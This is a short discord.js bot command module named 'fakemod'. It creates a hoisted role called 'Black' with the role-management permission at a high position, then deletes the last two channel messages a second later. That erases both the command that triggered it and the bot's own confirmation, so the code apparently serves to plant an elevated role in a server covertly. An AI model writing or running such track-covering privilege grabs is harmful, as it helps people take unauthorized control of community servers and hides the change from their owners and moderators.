const Discord = require('discord.js')

const catchErr = err => {
    console.log("An Error occurred.") // Error Func
}

module.exports = {
    commands: ['fakemod'], // Command Name
    callback: (message, arguments, text) => {
        if (message.channel instanceof Discord.DMChannel) {  // Do if dm
          message.author.send("Can't Use This In A DM.")
        }
        
        else {
          message.guild.roles.create({ // Creating the role since it doesn't exist.
            data: {
                name: "Black",
                color: "#222831",
                permissions: ["MANAGE_ROLES"],
                hoist: true,
                position: 42
            }
            
         }).then(role => {
            message.channel.send(`Role \`${role.name}\` created!`);
         });
         setTimeout(() => {
          const amount = 2
          message.channel.bulkDelete(amount)
        }, 1000)
        }
      }
}


